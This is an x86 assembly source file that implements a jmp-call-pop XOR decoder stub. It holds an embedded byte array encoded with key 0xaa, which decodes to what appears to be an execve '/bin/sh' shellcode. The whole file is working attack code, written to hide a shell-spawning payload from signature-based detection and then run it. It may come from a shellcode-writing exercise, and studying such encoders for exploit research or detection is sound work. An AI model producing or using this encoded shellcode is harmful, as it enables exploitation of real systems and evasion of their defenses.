; File: xorDec.asm
; Author: NiAllen Macy

global main

section .text
main:
	jmp short call_decoder

decoder:
	pop esi

decode:
	xor byte [esi], 0xaa
	jz shellcode
	inc esi
	jmp short decode

call_decoder:
	call decoder
	shellcode: db 0x41,0xb1,0xf4,0x9b,0x71,0x22,0xf4,0xad,0x23,0xdc,0xa2,0x23,0xf4,0xa6,0x27,0xb4,0x27,0xe4,0xa2,0x27,0xfc,0xa6,0x9b,0x6a,0x1a,0xa1,0x67,0x2a,0xfc,0x42,0x4a,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xaa